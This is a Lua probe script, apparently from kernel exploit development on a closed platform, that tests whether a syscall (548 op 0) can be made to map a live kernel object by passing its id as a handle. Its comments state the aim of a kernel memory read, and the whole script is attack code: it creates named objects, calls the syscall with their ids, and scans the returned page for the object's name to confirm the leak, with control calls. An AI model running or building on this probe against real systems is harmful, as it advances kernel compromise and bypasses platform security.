-- CRASH_CLASS: MODERATE
-- PROBE 851a: 548 op 0 with a live object id as the handle
--
-- Context: op 0's x struct is {entry[0], entry[0x10], prot, arg2, -1, entry[8]}
-- and 0xabd540 requires [0] < 0x4000.  dynlib handles fail.  osem ids are
-- allocated from the same 14-bit-looking space (824a: 0x0206, 0x4205), so a
-- small id is a candidate handle.  If op 0 maps the object, the page would
-- contain the object's own chunk - name string included - which is a kernel
-- read of a live object.

print("=== PROBE 851a: 548 OP 0 WITH AN OBJECT ID ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_byte(addr)
    local ok, v = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(v) end
    return nil
end

local sc548 = make_syscall(548)
local sc549 = make_syscall(549)

local entry = memory.alloc(0x40)
local name = memory.alloc(0x40)

local function setname(tag)
    for off = 0, 0x3F, 4 do safe_wd(name + off, 0) end
    for i = 1, #tag do
        local ok = pcall(function() memory.write_byte(name + i - 1, tag:byte(i)) end)
    end
    return name
end

local function call548(addr, second, len, prot, op)
    safe_wq(entry, addr)
    safe_wq(entry + 8, second)
    safe_wq(entry + 0x10, len)
    safe_wd(entry + 0x18, prot)
    safe_wd(entry + 0x1C, op)
    local ok, ret = pcall(function()
        return sc548(uint64(0), uint64(0), uint64(to_num(entry)), uint64(1), uint64(0))
    end)
    if not ok then return nil end
    return ret
end

print(string.format("[0] pid=%d", to_num(syscall.getpid())))

-- Create several objects and keep the ones whose id fits the handle bound.
local made = {}
for i = 1, 6 do
    local tag = string.format("hx%d", i)
    local nm = setname(tag)
    local ok, ret = pcall(function()
        return sc549(uint64(nm), uint64(1), uint64(0), uint64(0x1000))
    end)
    if ok then
        local id = to_num(ret)
        made[#made + 1] = { id = id, tag = tag }
        print(string.format("[A] create %s -> %s", tag, hx(ret)))
    else
        print(string.format("[A] create %s pcall-fail", tag))
    end
end

-- Map each small id and look for the object.
for i = 1, #made do
    local m = made[i]
    local id = m.id
    if id >= 0 and id < 0x4000 then
        for _, prot in ipairs({1, 3}) do
            local r = call548(id, 0, 0x4000, prot, 0)
            print(string.format("[B] id=%X (%s) prot=%d -> %s", id, m.tag, prot, r and hx(r) or "nil"))
            if r ~= nil then
                local v = to_num(r)
                if v > 0 and v < 0x8000000000 then
                    print(string.format("      %08X %08X %08X %08X",
                        safe_rd(v) or 0, safe_rd(v + 4) or 0,
                        safe_rd(v + 8) or 0, safe_rd(v + 12) or 0))
                    -- look for this object's own name bytes anywhere in the page
                    local want = {}
                    for k = 1, #m.tag do want[k] = m.tag:byte(k) end
                    local hits = 0
                    for off = 0, 0x4000 - #want do
                        local okm = true
                        for k = 1, #want do
                            if safe_byte(v + off + k - 1) ~= want[k] then okm = false break end
                        end
                        if okm then
                            hits = hits + 1
                            if hits <= 3 then print(string.format("      NAME '%s' at +0x%04X", m.tag, off)) end
                        end
                    end
                    print(string.format("      name hits=%d", hits))
                end
            end
        end
    else
        print(string.format("[B] id=%s (%s) above the handle bound, skipped", hx(id), m.tag))
    end
end

-- Control: a small number with no object behind it, and a real id with a bad length.
local c1 = call548(0x3FFE, 0, 0x4000, 1, 0)
local c2 = call548(made[1] and made[1].id or 1, 0, 0x2000, 1, 0)
print(string.format("[C] handle=3FFE -> %s ; id with len=2000 -> %s",
    c1 and hx(c1) or "nil", c2 and hx(c2) or "nil"))

print("[Z] alive=true")
print("=== PROBE 851a COMPLETE ===")
